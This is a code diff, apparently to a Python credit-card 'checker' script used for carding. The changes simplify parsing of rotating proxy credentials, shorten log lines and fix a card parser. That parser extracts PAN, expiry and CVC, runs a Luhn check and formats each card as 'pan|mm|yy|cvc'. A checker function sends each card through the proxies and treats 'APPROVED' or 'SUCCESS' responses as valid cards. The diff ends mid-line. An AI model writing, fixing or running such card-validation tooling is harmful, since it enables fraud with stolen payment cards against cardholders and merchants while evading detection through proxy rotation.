@@ -21,22 +21,9 @@ PROXIES = [
 
 def get_proxy():
     proxy_str = random.choice(PROXIES)
-    parts = proxy_str.split(':')
-    
-    if len(parts) == 4:  # oxylabs format
-        host = parts[0]
-        port = parts[1]
-        user = parts[2]
-        password = parts[3]
-    else:  # other format
-        host = parts[0]
-        port = parts[1]
-        user = parts[2]
-        password = parts[3]
-    
-    proxy_url = f"http://{user}:{password}@{host}:{port}"
-    print(f"[{datetime.now().strftime('%H:%M:%S')}] PROXY SELECTED → {host}:{port}")
-    
+    user, passw, host, port = proxy_str.split(':')
+    proxy_url = f"http://{user}:{passw}@{host}:{port}"
+    print(f"[{datetime.now().strftime('%H:%M:%S')}] PROXY → {host}:{port}")
     return {"http": proxy_url, "https": proxy_url}, f"{host}:{port}"
 
 # ================== CHECKER WITH FULL LOGS ==================
@@ -55,7 +42,7 @@ def pali(ccx):
         r = requests.get(url, proxies=proxy_dict, timeout=30)
         text = r.text
         
-        print(f"[{current_time}] STATUS CODE → {r.status_code}")
+        print(f"[{current_time}] STATUS → {r.status_code}")
         print(f"[{current_time}] RESPONSE → {text[:400]}")
         
         if "ORDER APPROVED" in text.upper() or "APPROVED" in text.upper() or "SUCCESS" in text.upper():
@@ -85,4 +72,11 @@ def luhn_check(number: str) -> bool:
 
 def reg(cc: str):
     parts = [p for p in re.split(r'\D+', cc) if p]
-    if len(parts) >= 4
+    if len(parts) >= 4:   # ← Colon added
+        pan = parts[0]
+        mm = parts[1].zfill(2)
+        yy = parts[2]
+        cvc = parts[3]
+        if not luhn_check(pan):
+            return None
+        return f"{pan}|{mm}|{yy}|{cvc
